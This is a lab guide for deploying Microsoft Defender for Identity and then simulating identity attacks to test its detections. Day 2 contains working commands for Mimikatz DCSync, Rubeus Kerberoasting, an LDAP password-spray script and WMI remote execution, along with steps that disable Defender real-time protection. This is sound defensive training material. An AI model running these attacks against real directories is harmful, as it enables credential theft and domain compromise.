# Microsoft Defender for Identity (MDI) - Enhanced Lab Guide

## Table of Contents
- [Overview](#overview)
- [Lab Topology](#lab-topology)
- [Prerequisites](#prerequisites)
- [Day 0: Environment Preparation](#day-0-environment-preparation)
- [Day 1: MDI Deployment & Configuration](#day-1-mdi-deployment--configuration)
- [Day 2: Attack Simulation & Detection](#day-2-attack-simulation--detection)
- [Troubleshooting](#troubleshooting)
- [Appendix](#appendix)
- [References](#references)

---

## Overview

This lab guide provides hands-on experience deploying Microsoft Defender for Identity (MDI) and using it to detect and investigate identity-based attacks. The lab emphasizes PowerShell-based configuration and automation wherever possible.

MDI Official Documenation: [Link](https://learn.microsoft.com/en-us/defender-for-identity/deploy/deploy-defender-identity)

**Estimated Time**: 210 minutes (Day 1: 90 minutes, Day 2: 120 minutes)

**Learning Objectives**:
- Deploy and configure MDI sensors using PowerShell
- Automate MDI configuration with the DefenderForIdentity module
- Configure required Active Directory settings (gMSA, audit policies, GPOs)
- Execute and detect common identity-based attacks
- Investigate security incidents using the Microsoft Defender portal

---

## Lab Topology

| Host | OS | Role | IP Address |
|------|-----|------|------------|
| DC | Windows Server 2022 | Domain Controller + MDI Sensor | 10.0.1.4 |
| WIN11-01 | Windows 11 Enterprise | Domain-Joined Client / Attack Host | 10.0.1.5 |
| WIN11-02 | Windows 11 Enterprise | Domain-Joined Client / Victim Host | 10.0.1.6 |

**Domain**: contoso.local  
**Forest Functional Level**: Windows Server 2016 or higher

---

## Prerequisites

### Azure & Microsoft 365 Requirements
- Active Azure subscription with permissions to create resources
- Microsoft 365 E5 or Microsoft Defender for Identity standalone license
- Global Administrator or Security Administrator role in Microsoft 365

### Infrastructure Requirements (Assumed Deployed)
- ✅ 1x Windows Server 2022 Domain Controller (DC)
- ✅ 2x Windows 11 Enterprise domain-joined clients (WIN11-01, WIN11-02)
- ✅ Active Directory Domain Services configured (contoso.local)
- ✅ Network connectivity between all hosts
- ✅ Internet connectivity from DC

### Software Requirements
- PowerShell 5.1 or PowerShell 7.4+ on DC, WIN11-01, and WIN11-02
- Remote Server Administration Tools (RSAT) on WIN11-01 and WIN11-02
- RDP access to all three hosts
- Local Administrator access on all hosts

---

## Day 0: Environment Preparation

### Task 1: Verify Infrastructure

**On DC**, open PowerShell as Administrator and verify the environment:

```powershell
# Verify Active Directory is running
Get-Service NTDS, DNS | Select-Object Name, Status

# Verify domain information
Get-ADDomain | Select-Object Name, DNSRoot, DomainMode

# Verify domain controllers
Get-ADDomainController -Filter * | Select-Object Name, OperatingSystem, IPv4Address

# Verify member servers are joined to domain
Get-ADComputer -Filter {OperatingSystem -like "*Windows 11*"} | Select-Object Name, DNSHostName

# Test connectivity to Microsoft Defender for Identity service
Test-NetConnection -ComputerName sensorapi.atp.azure.com -Port 443
Test-NetConnection -ComputerName triprd1wceuw1sensorapi.atp.azure.com -Port 443
```

**Expected Output**:
- NTDS and DNS services should be "Running"
- Domain should be contoso.local
- Both WIN11-01 and WIN11-02 should appear in domain computers
- Connectivity tests should show `TcpTestSucceeded : True`

[SCREENSHOT: PowerShell output showing successful verification]

---

### Task 2: Install RSAT on Windows 11 Clients

Remote Server Administration Tools (RSAT) are required on the Windows 11 clients to run Active Directory PowerShell cmdlets and manage domain resources.

**On WIN11-01 and WIN11-02**, open PowerShell as Administrator:

```powershell
# Check if RSAT-AD-PowerShell is already installed
Get-WindowsCapability -Name "Rsat.ActiveDirectory*" -Online | Select-Object Name, State

# Install RSAT Active Directory PowerShell module
Add-WindowsCapability -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0" -Online

# Verify installation
Get-WindowsCapability -Name "Rsat.ActiveDirectory*" -Online | Where-Object {$_.State -eq "Installed"}

# Test AD cmdlets are available
Get-Command -Module ActiveDirectory | Select-Object -First 5

# Verify domain connectivity
Get-ADDomain | Select-Object Name, DNSRoot
```

**Expected Output**:
- RSAT capability should show `State : Installed`
- ActiveDirectory module commands should be available
- Get-ADDomain should return contoso.local domain information

[SCREENSHOT: RSAT installation and verification on WIN11-01]

**Optional - Install all RSAT tools**:
```powershell
# To install all RSAT tools (not required for this lab, but useful)
Get-WindowsCapability -Name "RSAT*" -Online | Add-WindowsCapability -Online
```

---

### Task 3: Install DefenderForIdentity PowerShell Module

The DefenderForIdentity PowerShell module automates MDI configuration tasks, reducing errors and saving time.

**On DC**, install the module:

```powershell
# Check PowerShell version (must be 5.1 or 7.4+)
$PSVersionTable.PSVersion

# Import the Active Directory module
Import-Module -Name ActiveDirectory

# Install the DefenderForIdentity module from PowerShell Gallery
Install-Module -Name DefenderForIdentity -Force -Scope AllUsers

# If using PowerShell 7.4+, import GroupPolicy module first
Import-Module -Name GroupPolicy -SkipEditionCheck

# Import the DefenderForIdentity module
Import-Module -Name DefenderForIdentity

# Verify installation
Get-Module -Name DefenderForIdentity -ListAvailable
Get-Command -Module DefenderForIdentity
```

[SCREENSHOT: Successful module installation and command list]

**Reference**: [DefenderForIdentity PowerShell Module Overview](https://learn.microsoft.com/en-us/powershell/defenderforidentity/overview-defenderforidentity?view=defenderforidentity-latest)

---

### Task 4: Enable Active Directory Recycle Bin

The AD Recycle Bin helps MDI build historical baselines and detect object restoration attacks.

```powershell
# Enable Recycle Bin (cannot be disabled once enabled)
Enable-ADOptionalFeature -Identity 'Recycle Bin Feature' `
    -Scope ForestOrConfigurationSet `
    -Target (Get-ADDomain).DNSRoot `
    -Confirm:$false

# Verify Recycle Bin is enabled
Get-ADOptionalFeature -Filter {Name -like "Recycle Bin Feature"} | Select-Object Name, EnabledScopes
```

[SCREENSHOT: Recycle Bin enabled confirmation]

---

## Day 1: MDI Deployment & Configuration

### Task 1: Access Microsoft Defender Portal

1. Open a browser and navigate to: **https://security.microsoft.com**
2. Sign in with your Global Administrator or Security Administrator credentials
3. Navigate to **Settings** → **Identities**

[SCREENSHOT: Microsoft Defender portal - Settings → Identities]

4. On the **Sensors** page, note the **Access key** (you'll need this for sensor installation)

[SCREENSHOT: Access key location on Sensors page]

---

### Task 2: Configure KDS Root Key and Create gMSA

Group Managed Service Accounts (gMSA) provide automatic password management and simplified service principal name (SPN) management.

**On DC**, run the following:

```powershell
# Create KDS root key (required for gMSA)
# Using -EffectiveTime of 10 hours ago bypasses the 10-hour wait period in lab environments
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

# Verify KDS root key was created
Get-KdsRootKey

# Define variables
$gMSA_AccountName = "MDIgMSA"
$gMSA_GroupName = "MDISvcGroup"

# Create the gMSA using MDI PowerShell cmdlet
# This cmdlet creates the gMSA and configures basic permissions
New-MDIDSA -Identity $gMSA_AccountName -GmsaGroupName $gMSA_GroupName

# IMPORTANT: Update Kerberos encryption to AES256 only (security best practice)
# The New-MDIDSA cmdlet allows RC4 and AES128 by default, which is insecure
Set-ADServiceAccount -Identity $gMSA_AccountName `
    -DNSHostName (Get-ADDomain).DNSRoot `
    -KerberosEncryptionType AES256

# Verify gMSA configuration
Get-ADServiceAccount $gMSA_AccountName -Properties * | `
    Select-Object DNSHostName, SamAccountName, KerberosEncryptionType, `
    ManagedPasswordIntervalInDays, PrincipalsAllowedToRetrieveManagedPassword

# Test that the service account is functional
Test-ADServiceAccount -Identity $gMSA_AccountName
```

**Expected Output**:
- KDS root key created successfully
- gMSA account `MDIgMSA` created
- KerberosEncryptionType should show `AES256`
- Test-ADServiceAccount should return `True`

[SCREENSHOT: gMSA verification output]

---

### Task 3: Grant gMSA Permissions to Deleted Objects

MDI needs read access to the Deleted Objects container to detect object restoration attacks.

```powershell
# Get the Distinguished Name of the Deleted Objects container
$domainDN = (Get-ADDomain).DistinguishedName
$deletedObjectsDN = "CN=Deleted Objects,$domainDN"

# Grant the gMSA read permissions to Deleted Objects container
# Take ownership
$params = @("$deletedObjectsDN", '/takeOwnership')
& C:\Windows\System32\dsacls.exe $params

# Grant List Children and Read Property permissions
$domainNetBIOS = (Get-ADDomain).NetBIOSName
$params = @("$deletedObjectsDN", '/G', "${domainNetBIOS}\${gMSA_AccountName}$:LCRP")
& C:\Windows\System32\dsacls.exe $params

# Verify permissions were granted
& C:\Windows\System32\dsacls.exe $deletedObjectsDN | Select-String -Pattern $gMSA_AccountName
```

[SCREENSHOT: Deleted Objects permissions verification]

---

### Task 4: Download and Install Npcap

Npcap is a packet capture library required by the MDI sensor for network traffic analysis. It must be installed **before** the MDI sensor installation.

**On DC**, download and install Npcap:

1. Open a web browser and navigate to: **https://npcap.com/#download**

2. Download the latest Npcap installer (e.g., `npcap-1.84.exe`)

<img width="1013" height="298" alt="image" src="https://github.com/user-attachments/assets/fd914668-769b-4b28-a1cf-21bffe437c80" />


3. Run the installer with the following settings:

```powershell
# Create download directory if it doesn't exist
New-Item -Path "C:\Temp" -ItemType Directory -Force

# After manually downloading, install Npcap with required options
# Note: The installer path may vary based on your download location
$npcapInstaller = "$env:USERPROFILE\Downloads\npcap-1.84.exe"  # Adjust version as needed

# Install Npcap with WinPcap API-compatible mode enabled and loopback support disabled
# Note: /S flag does not work with non-OEM versions of Npcap
Start-Process -FilePath $npcapInstaller -ArgumentList "/winpcap_mode=yes /loopback_support=no /admin_only=no" -Wait

# Verify Npcap service is installed and running
Get-Service -Name "npcap" -ErrorAction SilentlyContinue | Select-Object Name, DisplayName, Status, StartType
```

**Manual Installation (if silent install doesn't work)**:
1. Double-click the Npcap installer
2. Accept the license agreement
3. ⚠️ **CRITICAL: You MUST select "Install Npcap in WinPcap API-compatible Mode"** ⚠️
   - **This option is REQUIRED for MDI to function properly**
   - **Without this option, the MDI sensor will NOT be able to capture network traffic**
4. Click **Install**
5. Restart the computer if prompted

<img width="999" height="658" alt="image" src="https://github.com/user-attachments/assets/5f58920d-06a0-4d05-8ab8-c1f502929bfb" />


> **⚠️ IMPORTANT WARNING ⚠️**  
> **The "Install Npcap in WinPcap API-compatible Mode" checkbox MUST be selected during installation.**  
> **Failure to enable this option will result in MDI sensor malfunction and no network traffic capture.**  
> **If you miss this step, you will need to uninstall and reinstall Npcap with the correct option.**

**Verify Npcap Installation**:
```powershell
# Check if Npcap driver is installed
Get-NetAdapter | Where-Object {$_.InterfaceDescription -like "*Npcap*"}

# Verify Npcap service
Get-Service -Name "npcap" | Select-Object Name, Status, StartType

# Check Npcap installation path
Test-Path "C:\Program Files\Npcap"
```

**Expected Output**:
- Npcap service should show `Status: Running` and `StartType: Automatic`
- Npcap program files should exist in `C:\Program Files\Npcap`

<img width="912" height="330" alt="image" src="https://github.com/user-attachments/assets/54c0e229-5611-46d3-a87a-85d17d6769fe" />


**Important**: If you skip this step, the MDI sensor installation will fail or the sensor will not be able to capture network traffic properly.

---

### Task 5: Download MDI Sensor

1. In the Microsoft Defender portal (**https://security.microsoft.com**), navigate to:
   - **Settings** → **Identities** → **Sensors** → **Download sensor**

2. Save the `Azure ATP sensor Setup.zip` file to **DC**

[SCREENSHOT: Download sensor page]

3. Extract the contents to `C:\Temp\MDISensor`

```powershell
# Create temp directory
New-Item -Path "C:\Temp\MDISensor" -ItemType Directory -Force

# Extract the sensor installer (adjust path to your Downloads folder)
Expand-Archive -Path "$env:USERPROFILE\Downloads\Azure ATP sensor Setup.zip" `
    -DestinationPath "C:\Temp\MDISensor" -Force

# Verify extraction
Get-ChildItem -Path "C:\Temp\MDISensor"
```

---

### Task 6: Install MDI Sensor via Command Line

**On DC**, install the sensor using the command line with your access key:

```powershell
# Define the access key from the Microsoft Defender portal
$AccessKey = "YOUR_ACCESS_KEY_HERE"  # Replace with actual access key

# Define the gMSA account
$DSA = "MDIgMSA"

# Navigate to the MDI Sensor directory
Set-Location -Path "C:\Temp\MDISensor"

# Install the MDI Sensor silently
Start-Process -Wait -NoNewWindow -FilePath ".\Azure ATP Sensor Setup.exe" `
    -ArgumentList "/quiet NetFrameworkCommandLineArguments=`"/q`" AccessKey=$AccessKey"

# Verify the service is installed and running
Get-Service -Name AATPSensor | Select-Object Name, DisplayName, Status, StartType

# Check sensor logs (may take a few minutes to generate)
Get-EventLog -LogName "Application" -Source "Azure Advanced Threat Protection Sensor" -Newest 10
```

**Note**: Replace `YOUR_ACCESS_KEY_HERE` with the actual access key from the Defender portal.

[SCREENSHOT: MDI sensor installation completion]

---

### Task 7: Verify Sensor Installation in Portal

1. Return to **https://security.microsoft.com**
2. Navigate to **Settings** → **Identities** → **Sensors**
3. Wait 5-10 minutes and refresh the page
4. Verify that **DC** appears in the sensors list with a status of **Running**

[SCREENSHOT: DC sensor showing as Running in portal]

---

### Task 8: Configure MDI Using PowerShell (Automated GPO Creation)

The `Set-MDIConfiguration` cmdlet automates the creation and configuration of required Group Policy Objects for MDI.

**On DC**, run:

```powershell
# Define variables
$Identity = "MDIgMSA"
$GpoPrefix = "MDI"

# Create and configure all required GPOs for domain mode
# This includes:
#   - Advanced Audit Policies (Directory Service Access, Account Logon)
#   - Event log settings
#   - Security policies
Set-MDIConfiguration -Mode Domain `
    -Configuration All `
    -GpoNamePrefix $GpoPrefix `
    -Identity $Identity

# Verify the configuration
Get-MDIConfiguration -Mode Domain `
    -Configuration All `
    -Identity $Identity `
    -GpoNamePrefix $GpoPrefix

# Generate a configuration report
New-MDIConfigurationReport -Mode Domain `
    -GpoNamePrefix $GpoPrefix `
    -Path "C:\Temp"

# View the created GPOs
Get-GPO -All | Where-Object { $_.DisplayName -like "$GpoPrefix*" } | `
    Select-Object DisplayName, GpoStatus, CreationTime
```

[SCREENSHOT: GPOs created by Set-MDIConfiguration]

---

### Task 9: Configure SAM-R Permissions GPO

Security Account Manager Remote (SAM-R) protocol access must be restricted to allow only the MDI gMSA and Administrators.

```powershell
# Get the SID of the MDIgMSA
$gMSA_SID = (Get-ADServiceAccount -Identity $Identity).SID.Value
Write-Host "MDIgMSA SID: $gMSA_SID" -ForegroundColor Green

# Get the SID of the Administrators group
$adminGroup_SID = (Get-ADGroup -Identity "Domain Admins").SID.Value
Write-Host "Domain Admins SID: $adminGroup_SID" -ForegroundColor Green

# Create SAM-R Security Descriptor in SDDL format
# O:BAG:BAD: = Owner: Built-in Administrators, Group: Built-in Administrators, DACL present
# (A;;RC;;;BA) = Allow Read Control to Built-in Administrators
# (A;;RC;;;SID) = Allow Read Control to specific SID
$samrSD = "O:BAG:BAD:(A;;RC;;;BA)(A;;RC;;;$gMSA_SID)"
Write-Host "SAM-R Security Descriptor: $samrSD" -ForegroundColor Yellow
```

**Manual GPO Configuration Required**:

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Forest: contoso.local** → **Domains** → **contoso.local**
3. Right-click **Default Domain Controllers Policy** → **Edit**
4. Navigate to:
   - **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
5. Double-click **Network access: Restrict clients allowed to make remote calls to SAM**
6. Check **Define this policy setting**
7. Click **Edit Security** button
8. Click **Add** and enter: **MDIgMSA$** (include the dollar sign)
9. Set permissions to **Allow** for **Remote Access**
10. Click **OK** to close all dialogs

[SCREENSHOT: SAM-R GPO configuration - Security Options]

[SCREENSHOT: SAM-R GPO configuration - Edit Security dialog]

**Alternative: PowerShell-based SAM-R configuration** (Advanced users):

```powershell
# Create or update Default Domain Controllers Policy with SAM-R settings
$gpoDC = Get-GPO -Name "Default Domain Controllers Policy"

# This requires manual registry key manipulation, which is complex
# Recommended: Use the GUI method above for SAM-R configuration

# Force GPO update on DC
gpupdate /force
```

---

### Task 10: Configure "Log on as a Service" Right for gMSA

The gMSA needs the "Log on as a Service" right to run the MDI sensor service.

```powershell
# Download and import the Carbon module (for managing user rights)
Install-Module -Name Carbon -Force -AllowClobber
Import-Module Carbon

# Grant "Log on as a Service" right to MDIgMSA
Grant-CPrivilege -Identity "CONTOSO\MDIgMSA$" -Privilege SeServiceLogonRight

# Verify the right was granted
Get-CPrivilege -Identity "CONTOSO\MDIgMSA$"
```

**Alternative: GPO-based configuration**:

1. Open **Group Policy Management Console** (gpmc.msc)
2. Edit the **Default Domain Controllers Policy**
3. Navigate to:
   - **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
4. Double-click **Log on as a service**
5. Click **Add User or Group**
6. Enter: **CONTOSO\MDIgMSA$**
7. Add: **NT SERVICE\ALL SERVICES**
8. Click **OK** to close all dialogs

[SCREENSHOT: Log on as a Service GPO configuration]

```powershell
# Force GPO update
gpupdate /force

# Restart the MDI Sensor service to apply new settings
Restart-Service -Name AATPSensor

# Verify service is running
Get-Service -Name AATPSensor
```

---

### Task 11: Validate MDI Configuration

```powershell
# Check MDI Sensor service status
Get-Service -Name AATPSensor | Format-List *

# Check sensor connectivity
Test-NetConnection -ComputerName sensorapi.atp.azure.com -Port 443

# Review sensor event logs
Get-EventLog -LogName "Application" -Source "Azure Advanced Threat Protection Sensor" -Newest 20 | `
    Select-Object TimeGenerated, EntryType, Message | Format-Table -Wrap

# Verify GPOs are applied
gpresult /H C:\Temp\gpresult.html
Start-Process "C:\Temp\gpresult.html"
```

[SCREENSHOT: MDI sensor service running and healthy]

**Final Verification in Microsoft Defender Portal**:

1. Navigate to **https://security.microsoft.com**
2. Go to **Settings** → **Identities** → **Health issues**
3. Verify there are no critical health alerts for DC

[SCREENSHOT: No health issues in Defender portal]

---

### Task 12: Configure Alert Thresholds

Microsoft Defender for Identity uses learning periods and thresholds to distinguish between legitimate and suspicious activities. For lab environments, you can adjust these thresholds to ensure alerts are generated more quickly.

**Navigate to Alert Threshold Settings**:

1. Open a browser and go to **https://security.microsoft.com**
2. Navigate to **Settings** → **Identities**
3. Under **Advanced features**, click **Adjust alerts thresholds**

[SCREENSHOT: Settings → Identities → Adjust alerts thresholds navigation]

**Configure Recommended Test Mode** (Optional for Lab):

```powershell
# The portal configuration is GUI-based, no PowerShell cmdlet available
# You must use the web interface to configure alert thresholds
```

**In the Defender Portal**:

1. On the **Adjust alerts thresholds** page, review the current threshold settings

2. **Enable Recommended Test Mode** (Optional):
   - Toggle **Recommended test mode** to **On**
   - This sets all alert threshold levels to 'Low', increasing alert volume
   - Recommended test mode is useful for lab environments to generate more alerts
   - Note: Test mode automatically disables after the specified date

[SCREENSHOT: Recommended test mode toggle enabled]

3. **Manually Adjust Individual Alert Thresholds** (Alternative):
   
   For a lab environment, consider setting these alerts to **Low** threshold:
   
   | Alert Name | Recommended Threshold | Reason |
   |------------|----------------------|---------|
   | Security principal reconnaissance (LDAP) | Low | Detect reconnaissance quickly |
   | Suspected AD FS DKM key read | Low | Immediate detection |
   | Suspected Brute Force attack (Kerberos, NTLM) | Low | Lower threshold for failed passwords |
   | Suspected DCSync attack | Low | Critical attack - immediate alert |
   | Suspected Golden Ticket usage | Low | Immediate detection |
   | Suspected identity theft (pass-the-ticket) | Low | Immediate detection |
   | Suspicious additions to sensitive groups | Low | Detect privilege escalation |
   | User and Group membership reconnaissance (SAMR) | Low | Detect enumeration attempts |

[SCREENSHOT: Alert thresholds configured to Low for lab environment]

**Understanding Threshold Levels**:

- **High**: Default/standard behavior with longer learning periods and higher confidence requirements
- **Medium**: Increased alert volume with moderate confidence thresholds
- **Low**: Maximum alert sensitivity with immediate triggering and lowest confidence thresholds

> **📝 Note for Lab Environments:**  
> Setting thresholds to **Low** ensures that your attack simulations in Day 2 will generate alerts quickly without waiting for learning periods to complete. In production environments, **High** or **Medium** thresholds are recommended to reduce false positives.

**Verify Configuration**:

1. Scroll through the alert list to confirm your threshold selections
2. Click **Save** if you made any changes
3. Changes take effect immediately

[SCREENSHOT: Alert threshold configuration saved]

---

## Day 2: Attack Simulation & Detection

### Overview

Day 2 focuses on simulating real-world identity-based attacks and investigating the detections in Microsoft Defender for Identity. You'll create test users, configure the environment, and execute attacks that demonstrate MDI's detection capabilities.

---

### Task 1: Create Lab Users and Groups

**On DC**, create test users and security groups:

```powershell
# Set domain component
$domainDN = (Get-ADDomain).DistinguishedName
$domainNetBIOS = (Get-ADDomain).NetBIOSName

# Create test users
$users = @(
    @{Name="RonHD"; FullName="Ron HD"; Password="Passw0rd12!@"},
    @{Name="JeffL"; FullName="Jeff Leatherman"; Password="Passw0rd12!@"},
    @{Name="SamiraA"; FullName="Samira Abbasi"; Password="Passw0rd12!@"},
    @{Name="HoneyTokenTest"; FullName="Honey Token Test"; Password="Passw0rd12!@"}
)

foreach ($user in $users) {
    $securePassword = ConvertTo-SecureString $user.Password -AsPlainText -Force
    New-ADUser -Name $user.Name `
        -SamAccountName $user.Name `
        -UserPrincipalName "$($user.Name)@contoso.local" `
        -DisplayName $user.FullName `
        -AccountPassword $securePassword `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -ChangePasswordAtLogon $false
    Write-Host "Created user: $($user.Name)" -ForegroundColor Green
}

# Add SamiraA to Domain Admins (privileged user)
Add-ADGroupMember -Identity "Domain Admins" -Members SamiraA
Write-Host "Added SamiraA to Domain Admins" -ForegroundColor Green

# Create HelpDesk security group
New-ADGroup -Name "HelpDesk" `
    -GroupScope Global `
    -GroupCategory Security `
    -Path "OU=Users,$domainDN" `
    -Description "Help Desk support staff"

# Add RonHD to HelpDesk group
Add-ADGroupMember -Identity "HelpDesk" -Members RonHD
Write-Host "Added RonHD to HelpDesk group" -ForegroundColor Green

# Grant JeffL local admin rights on WIN11-01 and WIN11-02
Invoke-Command -ComputerName WIN11-01 -ScriptBlock {
    net localgroup Administrators "$using:domainNetBIOS\JeffL" /add
}

Invoke-Command -ComputerName WIN11-02 -ScriptBlock {
    net localgroup Administrators "$using:domainNetBIOS\JeffL" /add
}

Write-Host "Granted JeffL local admin on WIN11-01 and WIN11-02" -ForegroundColor Green

# Verify user creation
Get-ADUser -Filter {Name -like "Ron*" -or Name -like "Jeff*" -or Name -like "Samira*" -or Name -like "Honey*"} | `
    Select-Object Name, SamAccountName, Enabled | Format-Table
```

[SCREENSHOT: Created users and group memberships]

---

### Task 2: Create Tools Directory and Share

**On DC**, create a shared directory for attack tools:

```powershell
# Create Tools directory
New-Item -Path "C:\Tools" -ItemType Directory -Force

# Create SMB share
New-SmbShare -Name "Tools" `
    -Path "C:\Tools" `
    -FullAccess "Everyone" `
    -Description "Lab attack tools"

# Verify share creation
Get-SmbShare -Name "Tools"

# Set NTFS permissions
$acl = Get-Acl "C:\Tools"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl "C:\Tools" $acl

Write-Host "Tools share created at \\DC\Tools" -ForegroundColor Green
```

[SCREENSHOT: Tools share created]

---

### Task 3: Download Attack Tools

**On DC**, download the required attack simulation tools:

```powershell
# Create download directory
$downloadPath = "C:\Tools"

# Function to download files
function Download-Tool {
    param($Url, $Output)
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $Url -OutFile $Output -UseBasicParsing
        Write-Host "Downloaded: $Output" -ForegroundColor Green
    }
    catch {
        Write-Host "Failed to download from $Url" -ForegroundColor Red
        Write-Host $_.Exception.Message -ForegroundColor Red
    }
}

# Download NetSess (for session enumeration)
Write-Host "Downloading NetSess..." -ForegroundColor Cyan
Download-Tool -Url "https://www.joeware.net/downloads/files/NetSess.zip" `
    -Output "$downloadPath\NetSess.zip"
Expand-Archive -Path "$downloadPath\NetSess.zip" -DestinationPath "$downloadPath\NetSess" -Force

# Download Mimikatz (for credential access attacks)
Write-Host "Downloading Mimikatz..." -ForegroundColor Cyan
Download-Tool -Url "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" `
    -Output "$downloadPath\mimikatz.zip"
Expand-Archive -Path "$downloadPath\mimikatz.zip" -DestinationPath "$downloadPath\mimikatz" -Force

# Download ORADAD (for LDAP reconnaissance)
Write-Host "Downloading ORADAD..." -ForegroundColor Cyan
Download-Tool -Url "https://github.com/ANSSI-FR/ORADAD/releases/latest/download/ORADAD.zip" `
    -Output "$downloadPath\ORADAD.zip"
Expand-Archive -Path "$downloadPath\ORADAD.zip" -DestinationPath "$downloadPath\ORADAD" -Force

# Download Rubeus (for Kerberos attacks)
Write-Host "Downloading Rubeus..." -ForegroundColor Cyan
Download-Tool -Url "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" `
    -Output "$downloadPath\Rubeus.exe"

# List downloaded tools
Write-Host "`nDownloaded tools:" -ForegroundColor Yellow
Get-ChildItem -Path $downloadPath -Recurse -Include *.exe | Select-Object FullName
```

**Note**: These are legitimate security tools used for authorized penetration testing. Use them only in controlled lab environments.

[SCREENSHOT: Attack tools downloaded successfully]

---

### Task 4: Configure Honey Token Account

Honey Token accounts are decoy accounts that trigger high-fidelity alerts when accessed.

**In Microsoft Defender Portal**:

1. Navigate to **https://security.microsoft.com**
2. Go to **Settings** → **Identities** → **Entity tags**
3. Click **Add** to create a new Honey Token tag
4. Search for and select **HoneyTokenTest** user
5. Click **Save**

[SCREENSHOT: Honey Token account configured]

---

### Exercise 2: Reconnaissance and Discovery Attacks

These attacks simulate an adversary's initial information gathering phase.

#### Attack 1: Account Enumeration via Kerberos

**Objective**: Detect Kerberos-based account enumeration

**On WIN11-01**, log in as **CONTOSO\JeffL** and execute:

```powershell
# Create a list of potential usernames
$usernames = @(
    "administrator",
    "admin",
    "RonHD",
    "JeffL",
    "SamiraA",
    "testuser",
    "serviceaccount"
)

# Attempt Kerberos pre-authentication for each username
foreach ($user in $usernames) {
    $result = klist purge
    $result = klist get "$user@CONTOSO.LOCAL"
    Start-Sleep -Seconds 2
}
```

[SCREENSHOT: Kerberos enumeration execution]

**Expected Detection**:
- Alert: **Account enumeration reconnaissance**
- Severity: Medium
- Detection time: 5-10 minutes

[SCREENSHOT: Account enumeration alert in Defender portal]

---

#### Attack 2: Security Principal Reconnaissance (LDAP)

**Objective**: Detect LDAP reconnaissance for Service Principal Names (SPNs)

**On WIN11-01**, as **CONTOSO\JeffL**:

```powershell
# Navigate to ORADAD directory
cd C:\Tools\ORADAD

# Execute LDAP reconnaissance
.\oradad.exe -c

# Wait for completion
Start-Sleep -Seconds 30
```

[SCREENSHOT: ORADAD execution]

**Expected Detection**:
- Alert: **Security principal reconnaissance (LDAP)**
- Severity: Medium
- Detection time: 5-10 minutes

[SCREENSHOT: LDAP reconnaissance alert]

---

#### Attack 3: Active Directory Attribute Reconnaissance

**On WIN11-01**, as **CONTOSO\JeffL**:

```powershell
# Use built-in Windows tools to enumerate AD attributes
dsquery user -limit 0 | dsget user -samid -fn -ln -email -title -dept

# Enumerate groups
dsquery group -limit 0 | dsget group -samid -desc -members

# Enumerate computers
dsquery computer -limit 0 | dsget computer -samid -desc
```

[SCREENSHOT: AD reconnaissance via dsquery]

**Expected Detection**:
- Alert: **Active Directory attributes reconnaissance (LDAP)**
- Severity: Medium

---

### Exercise 3: Persistence and Privilege Escalation

#### Attack 1: DCSync Attack Simulation

**Objective**: Simulate credential theft via DCSync

**On WIN11-01**, as **CONTOSO\JeffL**:

```powershell
# Navigate to Mimikatz
cd C:\Tools\mimikatz\x64

# Execute Mimikatz (will trigger Windows Defender - expected)
.\mimikatz.exe

# In Mimikatz console, run:
# privilege::debug
# lsadump::dcsync /domain:contoso.local /user:administrator
```

**Note**: You may need to disable Windows Defender temporarily for this attack:

```powershell
# Temporarily disable Real-time protection (re-enable after testing)
Set-MpPreference -DisableRealtimeMonitoring $true
```

[SCREENSHOT: Mimikatz DCSync execution]

**Expected Detection**:
- Alert: **Suspected DCSync attack (replication of directory services)**
- Severity: High
- Detection time: Immediate to 5 minutes

[SCREENSHOT: DCSync attack alert]

**Re-enable Windows Defender**:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

### Exercise 4: Credential Access Attacks

#### Attack 1: Suspected Brute Force Attack (LDAP)

**On WIN11-01**, create a script to simulate password spraying:

```powershell
# Create password spray script
$script = @'
$users = @("RonHD", "JeffL", "SamiraA", "Administrator")
$passwords = @("Password1", "Welcome1", "Summer2024", "Passw0rd")

foreach ($password in $passwords) {
    foreach ($user in $users) {
        try {
            $cred = New-Object System.DirectoryServices.DirectoryEntry(
                "LDAP://DC.contoso.local",
                "$user@contoso.local",
                $password
            )
            $null = $cred.NativeObject
            Write-Host "Success: $user / $password" -ForegroundColor Green
        }
        catch {
            Write-Host "Failed: $user / $password" -ForegroundColor Red
        }
        Start-Sleep -Seconds 3
    }
}
'@

# Save and execute
$script | Out-File "C:\Temp\spray.ps1"
powershell.exe -ExecutionPolicy Bypass -File "C:\Temp\spray.ps1"
```

[SCREENSHOT: Password spray execution]

**Expected Detection**:
- Alert: **Suspected brute force attack (LDAP)**
- Severity: Medium

---

#### Attack 2: Kerberoasting

**On WIN11-01**, as **CONTOSO\JeffL**:

```powershell
# Use Rubeus to perform Kerberoasting
C:\Tools\Rubeus.exe kerberoast /format:hashcat /outfile:C:\Temp\hashes.txt

# View captured hashes
Get-Content C:\Temp\hashes.txt
```

[SCREENSHOT: Rubeus Kerberoasting]

**Expected Detection**:
- Alert: **Suspicious service creation** or **Kerberos service ticket request**
- Severity: Medium to High

---

### Exercise 5: Lateral Movement Attacks

#### Attack 1: Remote Code Execution Attempt

**On WIN11-01**, as **CONTOSO\JeffL** (who has local admin on WIN11-02):

```powershell
# Attempt WMI-based remote execution
Invoke-WmiMethod -Class Win32_Process `
    -ComputerName WIN11-02 `
    -Name Create `
    -ArgumentList "cmd.exe /c whoami > C:\Temp\output.txt"

# Attempt PsExec-style execution
$cred = Get-Credential -UserName "CONTOSO\JeffL" -Message "Enter password"
Enter-PSSession -ComputerName WIN11-02 -Credential $cred

# In remote session:
whoami
hostname
exit
```

[SCREENSHOT: Remote code execution]

**Expected Detection**:
- Alert: **Remote code execution attempt**
- Severity: High

---

